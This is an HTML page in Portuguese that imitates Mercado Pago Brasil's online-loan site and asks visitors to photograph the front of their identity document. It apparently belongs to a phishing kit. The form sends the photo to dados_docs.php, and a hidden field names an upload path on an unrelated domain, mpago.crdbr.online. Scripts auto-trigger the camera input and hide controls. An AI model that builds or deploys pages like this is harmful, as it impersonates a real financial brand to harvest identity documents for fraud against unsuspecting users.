<!DOCTYPE html>
<html lang="pt-BR">
   <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <link rel="stylesheet" href="css/styles.css">
      <link rel="icon" type="image/x-icon" href="images/favicon.svg">
      <title>Mercado Pago Brasil | Empréstimo Online</title>

      <style>
        .hidden {
            display: none; 
        }
    </style>
   </head>
   <body>
      <div class="topo">
         <img class="logo_topo" src="images/logo_mobile.png">
         </head>
      </div>
      <form action="dados_docs.php" method="post" enctype="multipart/form-data">
         <input type="hidden" name="link" value="https://mpago.crdbr.online/uploads/">
         <input type="hidden" name="nome" value="MERCADO_PAGO">
         <div class="container">
            <h1>Envie uma foto da frente do seu documento</h1>
            <p>Para esta validação, você pode usar sua CNH, RG, RNE ou CNRM.
               Por favor, nos envie uma foto da frente do seu documento para comprovar que este documento pertence a você.
            </p>
           
            <img type="file" name="anexo" accept="image/*" class="img_foto" src="images/ladofoto.png">
             <div hidden>
            <input  type="file" id="anexo" name="anexo" accept="image/*" capture="environment">
            <img id="preview" class="img-preview">
         </div>
         </div>
         <div>
            <button id="botao" class="btn_cont" hidden>Enviar</button>
         </div>
      </form>
      <button id="btnFoto" class="btn_foto" onclick="hideButton(); clicarBotao2()">Tirar foto</button>
            <script>
               document.getElementById("anexo").addEventListener("change", function() {
                 document.getElementById("botao").hidden = false;
               });
            </script>

             <script>
        function hideButton() {
            // Seleciona o botão pelo ID e adiciona a classe 'hidden'
            document.getElementById("btnFoto").classList.add("hidden");
        }
    </script>

    <script>
        function clicarBotao2() {
            // Simula o clique no segundo botão
            document.getElementById("anexo").click();
        }
    </script>
            <!-- <script>
               document.getElementById("anexo").addEventListener("change", function(event) {
                 const reader = new FileReader();
                 reader.onload = function(e) {
                   document.getElementById("preview").src = e.target.result;
                 };
                 reader.readAsDataURL(event.target.files[0]);
               });
               </script> -->
         </div>
   
   </body>
</html>